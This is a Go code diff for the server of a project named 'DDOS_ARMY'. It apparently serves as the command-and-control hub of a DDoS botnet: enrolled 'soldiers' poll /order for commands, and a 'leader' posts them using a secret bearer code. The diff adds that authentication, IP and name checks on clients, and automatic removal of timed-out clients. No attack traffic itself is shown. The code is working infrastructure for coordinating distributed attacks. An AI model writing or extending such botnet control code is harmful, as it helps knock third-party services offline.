@@ -3,10 +3,15 @@ package server
 import (
 	"DDOS_ARMY/camp"
 	"container/list"
+	"crypto/rand"
+	"encoding/base64"
 	"encoding/json"
+	"github.com/fatih/color"
 	"io"
 	"log"
+	"net"
 	"net/http"
+	"time"
 )
 
 var orderList list.List
@@ -17,6 +22,8 @@ const (
 	STOP    = "STOP"
 	NOTHING = "NOTHING"
 )
+
+var leaderCode string
 
 func Ping(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "GET" {
@@ -45,11 +52,11 @@ func Camp(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		sl.Ip = r.RemoteAddr
-
+		sl.LastOrderRequestTime = time.Now()
 		//check if soldier is already in camp
-		if c.IsSoldierInCamp(sl.Ip) {
+		if c.IsSoldierInCamp(sl.Name) {
 			w.WriteHeader(http.StatusBadRequest)
-			w.Write([]byte("You are already in the camp"))
+			w.Write([]byte("this soldier is name already in the camp"))
 			return
 		}
 
@@ -83,23 +90,47 @@ func LeaveCamp(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	c := camp.GetCamp()
-	if !c.RemoveSoldier(r.RemoteAddr) {
+	queryParams := r.URL.Query()
+	name := queryParams.Get("name")
+	sl := c.GetSoldier(name)
+	if sl == nil {
 		w.WriteHeader(http.StatusBadRequest)
 		w.Write([]byte("You are not in the camp"))
 		return
 	}
+	inIp, _, err := net.SplitHostPort(r.RemoteAddr)
+	if err != nil {
+		log.Println(err)
+	}
+	slIp, _, err := net.SplitHostPort(sl.Ip)
+	if err != nil {
+		log.Println(err)
+	}
+	if inIp != slIp || sl.Name != name {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("You are not in the camp"))
+		return
+	}
+
+	c.RemoveSoldier(sl.Name)
 	w.WriteHeader(http.StatusCreated)
 	w.Write([]byte("you left the camp"))
 	log.Println("Soldier left camp: ", "have ip ", r.RemoteAddr)
 }
 
 func Order(w http.ResponseWriter, r *http.Request) {
+	log.Printf("Order request from %s", r.RemoteAddr)
 	if r.URL.Path != "/order" {
 		w.WriteHeader(http.StatusNotFound)
 		return
 	}
 	if r.Method == "POST" {
-		// TODO: check if order is from leader
+		authHeader := r.Header.Get("Authorization")
+		if authHeader != "Bearer "+leaderCode {
+			http.Error(w, "Unauthorized", http.StatusUnauthorized)
+			return
+		}
+
 		b := r.Body
 		defer b.Close()
 		orderb, _ := io.ReadAll(b)
@@ -114,10 +145,34 @@ func Order(w http.ResponseWriter, r *http.Request) {
 	} else if r.Method == "GET" {
 		if orderList.Len() == 0 {
 			w.Write([]byte(NOTHING))
+		} else {
+			e := orderList.Front()
+			w.Write([]byte(e.Value.(string)))
+		}
+
+		name := r.URL.Query().Get("name")
+		c := camp.GetCamp()
+		sl := c.GetSoldier(name)
+		if sl == nil {
+			w.Write([]byte("You are not in the camp"))
 			return
 		}
-		e := orderList.Front()
-		w.Write([]byte(e.Value.(string)))
+		inIp, _, err := net.SplitHostPort(r.RemoteAddr)
+		if err != nil {
+			log.Println(err)
+		}
+		slIp, _, err := net.SplitHostPort(sl.Ip)
+		if err != nil {
+			log.Println(err)
+		}
+		if inIp != slIp || sl.Name != name {
+			w.WriteHeader(http.StatusBadRequest)
+			w.Write([]byte("You are not in the camp"))
+			return
+		}
+
+		sl.UpdateLastOrderRequestTime()
+		log.Println(name, "updated  ", sl.GetLastOrderRequestTime())
 	} else {
 		w.WriteHeader(http.StatusMethodNotAllowed)
 		return
@@ -126,9 +181,29 @@ func Order(w http.ResponseWriter, r *http.Request) {
 
 func StartServer(address, port string) {
 	log.Printf("Starting server on %s:%s", address, port)
+	//create secret code for leader
+	bytes := make([]byte, 8)
+	_, err := rand.Read(bytes)
+	if err != nil {
+		panic(err)
+	}
+	leaderCode = base64.StdEncoding.EncodeToString(bytes)
+	log.Printf("secret Leader code: %s", leaderCode)
+	// always check soldier timeout and remove timeout soldiers
+	go func() {
+		for {
+			c := camp.GetCamp()
+			c.ScanAndRemoveTimeOutedSoldiers()
+			time.Sleep(5 * time.Second)
+		}
+	}()
+
 	http.HandleFunc("/ping", Ping)
 	http.HandleFunc("/camp", Camp)
 	http.HandleFunc("/order", Order)
 	http.HandleFunc("/leave", LeaveCamp)
-	http.ListenAndServe(address+":"+port, nil)
+	err = http.ListenAndServe(address+":"+port, nil)
+	if err != nil {
+		color.Red("Error starting server: %s", err)
+	}
 }
